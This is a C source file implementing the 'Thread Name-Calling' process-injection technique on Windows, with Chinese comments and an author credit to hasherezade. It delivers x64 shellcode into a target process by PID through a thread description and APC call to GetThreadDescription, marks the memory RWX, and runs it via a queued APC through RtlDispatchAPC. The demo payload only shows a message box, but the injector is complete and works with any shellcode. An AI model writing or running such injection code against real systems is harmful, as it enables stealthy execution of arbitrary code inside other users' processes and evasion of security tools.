#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <winternl.h>

// Undocumented ThreadNameInformation value (not in standard winternl.h)
#ifndef ThreadNameInformation
#define ThreadNameInformation 38
#endif

// Undocumented functions
typedef NTSTATUS (NTAPI *pNtSetInformationThread)(
    HANDLE ThreadHandle,
    THREADINFOCLASS ThreadInformationClass,
    PVOID ThreadInformation,
    ULONG ThreadInformationLength
);

typedef NTSTATUS (NTAPI *pNtQueueApcThreadEx2)(
    HANDLE ThreadHandle,
    HANDLE UserApcReserveHandle,
    ULONG QueueUserApcFlags,
    PVOID ApcRoutine,
    PVOID SystemArgument1,
    PVOID SystemArgument2,
    PVOID SystemArgument3
);

typedef NTSTATUS (NTAPI *pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID SystemArgument1,
    PVOID SystemArgument2,
    PVOID SystemArgument3
);

typedef NTSTATUS (NTAPI *pNtReadVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
);

typedef NTSTATUS (NTAPI *pRtlInitUnicodeStringEx)(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
);

// NT_SUCCESS already defined in winternl.h
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#define QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC 0x00000001
#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)

// MessageBox shellcode (x64)
unsigned char g_Shellcode[] =
    "\x48\x83\xEC\x28"                                     // sub rsp, 0x28
    "\x48\x31\xC9"                                          // xor rcx, rcx
    "\x48\x8D\x15\x1E\x00\x00\x00"                         // lea rdx, [rip+0x1E]
    "\x4C\x8D\x05\x29\x00\x00\x00"                         // lea r8, [rip+0x29]
    "\x48\x31\xC0"                                          // xor rax, rax
    "\x4D\x31\xC9"                                          // xor r9, r9
    "\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00"             // mov rax, MessageBoxA (to be patched)
    "\xFF\xD0"                                              // call rax
    "\x48\x83\xC4\x28"                                     // add rsp, 0x28
    "\xC3"                                                  // ret
    // "Injected!\0"
    "\x49\x6E\x6A\x65\x63\x74\x65\x64\x21\x00"
    // "Thread Name-Calling\0"
    "\x54\x68\x72\x65\x61\x64\x20\x4E\x61\x6D\x65\x2D"
    "\x43\x61\x6C\x6C\x69\x6E\x67\x00";

SIZE_T g_ShellcodeSize = sizeof(g_Shellcode);

// 获取进程句柄
HANDLE OpenTargetProcess(DWORD processId) {
    DWORD access = PROCESS_QUERY_LIMITED_INFORMATION |
                  PROCESS_VM_READ |
                  PROCESS_VM_OPERATION;

    HANDLE hProcess = OpenProcess(access, FALSE, processId);
    if (!hProcess || hProcess == INVALID_HANDLE_VALUE) {
        printf("[x] Failed to open process: %lu\n", GetLastError());
        return NULL;
    }

    printf("[+] Opened target process (PID %lu): %p\n", processId, hProcess);
    return hProcess;
}

// 查找目标进程的线程
HANDLE FindTargetThread(DWORD targetPid) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[x] Failed to create thread snapshot\n");
        return NULL;
    }

    THREADENTRY32 te = {0};
    te.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(snapshot, &te)) {
        CloseHandle(snapshot);
        return NULL;
    }

    HANDLE hThread = NULL;
    DWORD access = SYNCHRONIZE | THREAD_SET_CONTEXT | THREAD_SET_LIMITED_INFORMATION;

    do {
        if (te.th32OwnerProcessID == targetPid) {
            hThread = OpenThread(access, FALSE, te.th32ThreadID);
            if (hThread && hThread != INVALID_HANDLE_VALUE) {
                printf("[+] Found thread TID=%lu\n", te.th32ThreadID);
                CloseHandle(snapshot);
                return hThread;
            }
        }
    } while (Thread32Next(snapshot, &te));

    CloseHandle(snapshot);
    printf("[x] No suitable thread found\n");
    return NULL;
}

// 获取目标进程 PEB 中的未使用区域
PVOID GetPebUnusedArea(HANDLE hProcess) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
        HANDLE ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );

    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

    if (!NtQueryInformationProcess) {
        printf("[x] Failed to get NtQueryInformationProcess\n");
        return NULL;
    }

    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG returnLength = 0;

    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &returnLength
    );

    if (!NT_SUCCESS(status)) {
        printf("[x] NtQueryInformationProcess failed: 0x%lX\n", status);
        return NULL;
    }

    // PEB + 0x340 是一个未使用的区域，可以用来存储指针
    const ULONG_PTR UNUSED_OFFSET = 0x340;
    PVOID remotePtr = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + UNUSED_OFFSET);

    printf("[+] PEB base address: %p\n", pbi.PebBaseAddress);
    printf("[+] Using PEB unused area: %p\n", remotePtr);

    return remotePtr;
}

// 读取远程进程内存
BOOL ReadRemoteMemory(HANDLE hProcess, PVOID remoteAddr, PVOID buffer, SIZE_T bufferSize) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtReadVirtualMemory NtReadVirtualMemory =
        (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");

    if (!NtReadVirtualMemory) {
        return FALSE;
    }

    memset(buffer, 0, bufferSize);
    SIZE_T bytesRead = 0;

    NTSTATUS status = NtReadVirtualMemory(hProcess, remoteAddr, buffer, bufferSize, &bytesRead);

    if (!NT_SUCCESS(status) || bytesRead != bufferSize) {
        return FALSE;
    }

    return TRUE;
}

// 设置线程描述（支持任意字节，包括 NULL）
HRESULT SetThreadDescriptionEx(HANDLE hThread, const BYTE* buf, SIZE_T bufSize) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    pRtlInitUnicodeStringEx RtlInitUnicodeStringEx =
        (pRtlInitUnicodeStringEx)GetProcAddress(hNtdll, "RtlInitUnicodeStringEx");
    pNtSetInformationThread NtSetInformationThread =
        (pNtSetInformationThread)GetProcAddress(hNtdll, "NtSetInformationThread");

    if (!RtlInitUnicodeStringEx || !NtSetInformationThread) {
        return E_FAIL;
    }

    // 创建带 padding 的缓冲区
    BYTE* padding = (BYTE*)calloc(bufSize + sizeof(WCHAR), 1);
    if (!padding) {
        return E_OUTOFMEMORY;
    }

    memset(padding, 'A', bufSize);

    UNICODE_STRING ustr = {0};
    RtlInitUnicodeStringEx(&ustr, (PCWSTR)padding);

    // 填充真实内容
    memcpy(ustr.Buffer, buf, bufSize);

    NTSTATUS status = NtSetInformationThread(
        hThread,
        ThreadNameInformation,
        &ustr,
        sizeof(UNICODE_STRING)
    );

    free(padding);

    return HRESULT_FROM_NT(status);
}

// 队列 APC
BOOL QueueApcThread(HANDLE hThread, PVOID func, PVOID arg0, PVOID arg1, PVOID arg2) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    // 优先使用 NtQueueApcThreadEx2（Windows 10+）
    pNtQueueApcThreadEx2 NtQueueApcThreadEx2 =
        (pNtQueueApcThreadEx2)GetProcAddress(hNtdll, "NtQueueApcThreadEx2");

    if (NtQueueApcThreadEx2) {
        printf("[+] Using NtQueueApcThreadEx2\n");
        NTSTATUS status = NtQueueApcThreadEx2(
            hThread,
            NULL,
            QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
            func,
            arg0,
            arg1,
            arg2
        );

        if (NT_SUCCESS(status)) {
            return TRUE;
        }
    }

    // 回退到 NtQueueApcThread
    pNtQueueApcThread NtQueueApcThread =
        (pNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");

    if (NtQueueApcThread) {
        printf("[+] Using NtQueueApcThread\n");
        NTSTATUS status = NtQueueApcThread(hThread, func, arg0, arg1, arg2);
        return NT_SUCCESS(status);
    }

    return FALSE;
}

// 通过线程名称传递数据
PVOID PassViaThreadName(HANDLE hProcess, HANDLE hThread, const BYTE* buf,
                        SIZE_T bufSize, PVOID remotePtr) {
    if (!remotePtr) {
        printf("[x] Remote pointer not set\n");
        return NULL;
    }

    // 设置线程描述
    printf("[+] Setting thread description (%lu bytes)...\n", (unsigned long)bufSize);
    HRESULT hr = SetThreadDescriptionEx(hThread, buf, bufSize);

    if (FAILED(hr)) {
        printf("[x] Failed to set thread description: 0x%lX\n", hr);
        return NULL;
    }

    printf("[+] Thread description set successfully\n");

    // 通过 APC 调用 GetThreadDescription
    // GetThreadDescription 的签名：HRESULT GetThreadDescription(HANDLE hThread, PWSTR* ppszDescription)
    // 我们传递：NtCurrentThread() 作为 hThread，remotePtr 作为 ppszDescription
    PVOID getThreadDescFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetThreadDescription");
    if (!getThreadDescFunc) {
        printf("[x] Failed to get GetThreadDescription address\n");
        return NULL;
    }

    printf("[+] Queueing APC to call GetThreadDescription...\n");
    if (!QueueApcThread(hThread, getThreadDescFunc, (PVOID)NtCurrentThread(), remotePtr, NULL)) {
        printf("[x] Failed to queue APC\n");
        return NULL;
    }

    printf("[+] APC queued successfully\n");

    // 等待指针被写入
    PVOID bufferPtr = NULL;
    BOOL isRead = FALSE;
    int attempts = 0;

    while (attempts < 10) {
        Sleep(1000);
        attempts++;

        isRead = ReadRemoteMemory(hProcess, remotePtr, &bufferPtr, sizeof(PVOID));
        if (isRead && bufferPtr != NULL) {
            printf("[+] Buffer pointer received: %p\n", bufferPtr);
            return bufferPtr;
        }

        printf("[-] Waiting for buffer pointer (attempt %d/10)...\n", attempts);
    }

    printf("[x] Timeout waiting for buffer pointer\n");
    return NULL;
}

// 执行注入的代码
BOOL RunInjected(HANDLE hProcess, PVOID shellcodePtr, SIZE_T payloadLen) {
    // 查找线程
    DWORD targetPid = GetProcessId(hProcess);
    HANDLE hThread = FindTargetThread(targetPid);

    if (!hThread) {
        printf("[x] Failed to find thread\n");
        return FALSE;
    }

    // 修改内存保护为可执行
    printf("[+] Changing memory protection to RWX...\n");
    DWORD oldProtect = 0;

    if (!VirtualProtectEx(hProcess, shellcodePtr, payloadLen, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[x] VirtualProtectEx failed: %lu\n", GetLastError());
        CloseHandle(hThread);
        return FALSE;
    }

    printf("[+] Memory protection changed (old: 0x%lX)\n", oldProtect);

    // 通过 APC 执行 shellcode
    // 使用 RtlDispatchAPC 作为代理函数
    PVOID rtlDispatchApc = GetProcAddress(GetModuleHandleA("ntdll.dll"), MAKEINTRESOURCEA(8));
    if (rtlDispatchApc) {
        printf("[+] Using RtlDispatchAPC as proxy\n");
        if (QueueApcThread(hThread, rtlDispatchApc, shellcodePtr, 0, (PVOID)(-1))) {
            printf("[+] APC queued for execution!\n");
            CloseHandle(hThread);
            return TRUE;
        }
    }

    // 回退：直接调用 shellcode
    printf("[+] Directly queueing shellcode\n");
    if (QueueApcThread(hThread, shellcodePtr, 0, 0, 0)) {
        printf("[+] APC queued for execution!\n");
        CloseHandle(hThread);
        return TRUE;
    }

    printf("[x] Failed to queue execution APC\n");
    CloseHandle(hThread);
    return FALSE;
}

int main(int argc, char* argv[]) {
    printf("[*] Thread Name-Calling Injection\n");
    printf("[*] Author: hasherezade (C implementation)\n\n");

    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return -1;
    }

    DWORD targetPid = atoi(argv[1]);
    if (targetPid == 0) {
        printf("[x] Invalid PID\n");
        return -1;
    }

    // Patch MessageBoxA address
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    FARPROC pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");
    if (!pMessageBoxA) {
        printf("[x] Failed to get MessageBoxA address\n");
        return -1;
    }
    *(DWORD64*)(g_Shellcode + 26) = (DWORD64)pMessageBoxA;

    printf("[+] Target PID: %lu\n", targetPid);

    // 打开目标进程
    HANDLE hProcess = OpenTargetProcess(targetPid);
    if (!hProcess) {
        return -1;
    }

    // 获取 PEB 未使用区域
    PVOID remotePtr = GetPebUnusedArea(hProcess);
    if (!remotePtr) {
        CloseHandle(hProcess);
        return -1;
    }

    // 查找线程
    HANDLE hThread = FindTargetThread(targetPid);
    if (!hThread) {
        CloseHandle(hProcess);
        return -1;
    }

    // 通过线程名称传递 shellcode
    printf("\n[*] Step 1: Passing shellcode via thread name...\n");
    PVOID shellcodePtr = PassViaThreadName(hProcess, hThread, g_Shellcode, g_ShellcodeSize, remotePtr);

    CloseHandle(hThread);

    if (!shellcodePtr) {
        printf("[x] Failed to pass shellcode via thread name\n");
        CloseHandle(hProcess);
        return -1;
    }

    // 执行注入的代码
    printf("\n[*] Step 2: Executing injected code...\n");
    if (!RunInjected(hProcess, shellcodePtr, g_ShellcodeSize)) {
        printf("[x] Failed to execute injected code\n");
        CloseHandle(hProcess);
        return -1;
    }

    printf("\n[+] Injection completed successfully!\n");
    printf("[!] Interact with the target process to trigger APC execution\n");

    CloseHandle(hProcess);
    return 0;
}
